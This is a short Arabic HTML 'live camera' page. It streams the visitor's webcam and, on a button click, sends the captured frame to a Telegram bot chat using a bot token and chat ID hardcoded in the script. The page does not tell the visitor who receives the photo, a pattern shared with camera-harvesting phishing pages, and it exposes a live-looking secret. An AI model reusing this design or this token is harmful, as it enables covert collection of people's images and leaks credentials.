<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>تطبيق الكاميرا المباشر</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding: 20px; }
        video, canvas { width: 320px; height: 240px; border: 1px solid #ccc; border-radius: 8px; margin: 10px; }
        button { padding: 10px 20px; cursor: pointer; }
    </style>
</head>
<body>

    <h2>تطبيق الكاميرا المباشر</h2>
    
    <div>
        <video id="webcam" autoplay playsinline></video>
    </div>

    <button id="captureBtn">التقاط وإرسال الصورة</button>

    <canvas id="canvas" style="display:none;"></canvas>

    <!-- وسم بداية البرمجة -->
    <script>
        const TOKEN = "8896286925:AAF3q7qJf76Syaa1z-d15oxnmxr5tKdyiCU";
        const CHAT_ID = "8790754582";

        const video = document.getElementById('webcam');
        const canvas = document.getElementById('canvas');
        const captureBtn = document.getElementById('captureBtn');

        let isStreamActive = false;

        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
                isStreamActive = true;
            })
            .catch(err => {
                console.error("تعذر الوصول إلى الكاميرا:", err);
                alert("تعذر تشغيل الكاميرا. تأكد من إغلاق البرامج التي تستخدمها والسماح بالوصول للمتصفح.");
            });

        captureBtn.addEventListener('click', () => {
            if (!isStreamActive || video.videoWidth === 0) {
                alert("الكاميرا غير متصلة أو لم تبدأ بعد!");
                return;
            }

            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(blob => {
                if (!blob) {
                    alert("حدث خطأ أثناء معالجة الصورة.");
                    return;
                }

                const formData = new FormData();
                formData.append('photo', blob, 'capture.jpg');
                formData.append('chat_id', CHAT_ID);

                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                })
                .then(res => res.json())
                .then(data => {
                    if (data.ok) {
                        alert("تم إرسال الصورة بنجاح!");
                    } else {
                        alert("فشل الإرسال: " + data.description);
                    }
                })
                .catch(err => console.error("خطأ في الإرسال:", err));
            }, 'image/jpeg', 0.8);
        });
    </script>
    <!-- وسم نهاية البرمجة -->

</body>
</html>
